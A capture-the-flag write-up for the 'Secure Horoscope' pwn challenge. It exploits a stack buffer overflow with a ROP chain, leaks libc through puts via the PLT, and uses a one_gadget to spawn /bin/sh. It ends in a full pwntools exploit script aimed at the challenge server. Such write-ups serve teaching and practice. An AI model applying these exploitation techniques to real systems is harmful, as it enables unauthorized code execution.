# Secure Horoscope

## Challenge

Our horoscope developers have pivoted to a more security-focused approach to predicting the future. You won’t find breaking into this one quite so easy!

Connect ```nc sechoroscope.sdc.tf 1337```

[binary](secureHoroscope)

By green beans

## Solution

The program suffers a bufferoverflow vulnerability in ```getInfo()```

```
004007b1  int64_t getInfo()

004007ca      void var_78
004007ca      memset(&var_78, 0, 100)
004007e0      read(fd: 0, buf: &var_78, nbytes: 140)
004007ec      puts(str: &var_78)
004007f8      puts(str: "hm, I'll have to think about wha…")
0040080e      return fflush(fp: stdout)
```

However, we noticed that in the 24 bytes we had for the overflow have some corruption. However, luckily there are 24 bytes from the first ```fgets call``` at ```0x400717```

```
pwndbg> stack

0         0x40080e getInfo+93
f 1 0x4242424242424242
f 2 0x4242424242424242
f 3      0x142424242
f 4 0x4141414141414141
f 5 0x4141414141414141
f 6 0x4141414141414141
f 7         0x40000a

```

So we developed a small chain to ```pop r14, r15, ret``` to remove the corrupted bytes and advanced into the uncorrupted chain. 

```python
stage1 = pop_junk
stage1 += p64(0xdeadbeef)
stage1 += p64(0xbadc0d3)
```

After that we decided to leak libc using ret2_plt

```python
stage0 = pop_rdi
stage0 +=p64(e.got['puts'])
stage0 +=p64(e.plt['puts'])
```

After leaking libc and calculating the base address, we used ```one_gadget```  to execute ```system('/bin/sh\0')```

```
└─# one_gadget -f libc6_2.27-3ubuntu1.5_amd64.so 
0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
````

The gadget we chose requried rsp+40 to be null. We padded our overflow with ```p64(0x0)```, which set ```rsp+40 = NULL```

```python
pad = b'6/1/22'
pad += cyclic(34)
pad += p64(0x0)*10 
p.sendline(pad+one_gadget)
```

Finally, putting it all together, our working exploit follows.

```python
from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)
r = ROP(e)

if args.REMOTE:
   libc = ELF('libc6_2.27-3ubuntu1.5_amd64.so',checksec=False)
else:
   libc = ELF('libc6_2.33-6_amd64.so',checksec=False)

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('sechoroscope.sdc.tf', 1337)
    else:
        return process(e.path)

p = start()

def ret2_plt():
   pop_junk = p64(0x0400870)
   pop_rdi = p64(0x0400873)

   stage1 = pop_junk
   stage1 += p64(0xdeadbeef)
   stage1 += p64(0xbadc0d3)

   stage0 = pop_rdi
   stage0 +=p64(e.got['puts'])
   stage0 +=p64(e.plt['puts'])
   stage0 += p64(e.sym['main'])

   log.info("Clearing Corrupted Stack")
   p.recvuntil(b'To get started, tell us how you feel')
   p.sendline(stage0)
   p.recvuntil(b'have your very own horoscope')
   p.sendline(b'\n')
   p.recvuntil(b'have your very own horoscope')

   log.info("Leaking Libc; Returning to Main")
   p.sendline(b'6/1/22'+cyclic(114)+stage1)
   p.recvuntil(b'5 business days')
   p.recvline()
   leak=u64(p.recv(6)+b'\x00\x00')
   log.info("Libc Leak (puts): %s" %hex(leak))
   libc.address=leak-libc.sym['puts']
   log.info("Libc base address: %s" %hex(libc.address))

def ret2_onegadget():
   if args.REMOTE:
      one_gadget = p64(libc.address+0x4f302)
   else:
      one_gadget = p64(libc.address+0xcb5d0)

   p.recvuntil(b'have your very own horoscope')
   log.info("Returning to One Gadget")

   pad = b'6/1/22'
   pad += cyclic(34)
   pad += p64(0x0)*10 
   p.sendline(pad+one_gadget)
   p.interactive()

ret2_plt()
ret2_onegadget()
```
